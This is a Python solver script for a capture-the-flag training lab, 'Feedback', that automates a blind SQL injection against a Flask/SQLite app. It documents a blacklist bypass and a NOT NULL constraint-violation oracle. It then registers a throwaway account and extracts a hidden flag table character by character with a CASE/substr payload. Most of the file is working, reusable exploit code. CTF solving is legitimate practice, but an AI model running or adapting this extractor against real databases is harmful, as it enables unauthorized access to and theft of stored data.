#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FEEDBACK  -  FlagYard Web solver

Feedback (FlagYard Training Labs, Easy / SAFCSP) - "Submit your feedback".

Flask + SQLite app. Logged-in users POST / with a `feedback` field. The
INSERT is built with string formatting (only username is parameterized):

    INSERT INTO feedback(username, feedback) VALUES(?,'%s')   % feedback

=> classic second-order blind SQL injection in the feedback field.

The `flag` table holds the flag but no page ever reads it, and failures are
silenced ('Something went wrong' vs 'Thanks for the feedback') - so the goal
becomes a char-by-char BLIND extraction using the target table's constraints:

    '' || (CASE WHEN (SELECT substr(flag,n,1) FROM flag) = 'c'
                THEN NULL ELSE 'x' END) || ''

* char matches  -> the CASE yields NULL -> feedback NOT NULL violated
                   -> INSERT throws   -> "Something went wrong"
* char differs  -> 'x'                -> INSERT succeeds -> "Thanks..."

Note (why not a missing table): SQLite resolves table names at prepare time,
so a `FROM zzzz` branch errors even when never taken. The NOT NULL
constraint is the clean runtime oracle.

The app's blacklist (exec/load/blob/glob/union/join/like/match/regexp/in/
limit/order/hex/where) is bypassed: substr/flag/select/null are untouched.

Verified live: the tool extracted the flag via the feedback blind SQLi and
saves it to `flag_from_feedback.txt`.
"""
from __future__ import annotations

import http.client
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("F E E D B A C K   S O L V E R",
              "feedback blind SQLi -> flag table -> substr oracle"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Feedback challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    if url.startswith("//"):
        url = url[2:]
    m = re.match(r"^(.*?)(:\d+)?$", url)
    host = m.group(1)
    port = int(m.group(2).lstrip(":")) if m.group(2) else 80
    return host, port

def post(host, port, path, data, cookie=None):
    body = urllib.parse.urlencode(data).encode("utf-8")
    c = http.client.HTTPConnection(host, port, timeout=30)
    h = {"Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0"}
    if cookie:
        h["Cookie"] = cookie
    c.request("POST", path, body=body, headers=h)
    r = c.getresponse()
    d = r.read()
    sc = r.getheader("Set-Cookie") or ""
    c.close()
    return r.status, d, sc

def get(host, port, path, cookie=None):
    c = http.client.HTTPConnection(host, port, timeout=30)
    c.request("GET", path, headers={"Cookie": cookie} if cookie else {})
    r = c.getresponse()
    d = r.read()
    c.close()
    return r.status, d

def oracle_true(host, port, cookie, pos, ch):
    """True -> substr(flag,pos,1) == ch. Inverted oracle: a match evaluates
       the CASE to NULL, violating the feedback NOT NULL column, so the
       INSERT throws and the page shows 'Something went wrong'."""
    cond = "(SELECT substr(flag,%d,1) FROM flag) = '%s'" % (pos, ch)
    # second value = '' || CASE || ''  (single expression, 2 columns kept)
    feedback = ("' || (CASE WHEN %s THEN NULL ELSE 'x' END) || '" % cond)
    st, d, _sc = post(host, port, "/", {"feedback": feedback}, cookie=cookie)
    return b"Something went wrong" in d

CHARSET_HEAD = "FlagY{}0123456789abcdef"
CHARSET_BODY = "0123456789abcdef}"

def extract_flag(host, port, cookie):
    flag_bits = []
    for pos in range(1, 61):
        charset = CHARSET_HEAD if pos <= 6 else CHARSET_BODY
        found = False
        for ch in charset:
            tick(max(0.05, pos / 60.0),
                 "flag so far: %s ...  [pos %d / %s]" %
                 ("".join(flag_bits) or "{", pos, ch))
            if oracle_true(host, port, cookie, pos, ch):
                flag_bits.append(ch)
                found = True
                break
        if not found:
            break
    return "".join(flag_bits)

def main():
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host, port = parse_host(url)
    step("target host %s:%d" % (host, port))

    # ------------- register a throwaway account ---------------------------
    user = "u%d" % random.randint(100000, 999999)
    pw = "p%d" % random.randint(100000, 999999)
    st, d, _ = post(host, port, "/register",
                    {"username": user, "password": pw})
    if st != 200:
        fail("register failed or disabled")
        return
    ok("registered account %s" % user)

    # ------------- login -> session cookie ---------------------------------
    st, d, sc = post(host, port, "/login",
                     {"username": user, "password": pw})
    cookie = sc.split(";")[0] if sc else ""
    if not cookie:
        fail("no session cookie after login")
        return
    ok("logged in (session cookie acquired)")

    # ------------- blind SQLi: extract flag.flag ---------------------------
    step("blind SQLi on the feedback field (substr oracle)")
    flag = extract_flag(host, port, cookie)
    print()
    if not flag.startswith("FlagY"):
        fail("extraction incomplete: %r" % flag)
        fail("(the instance may have been reset - re-run the solver)")
        return

    ok("FLAG = %s" % flag)

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_feedback.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()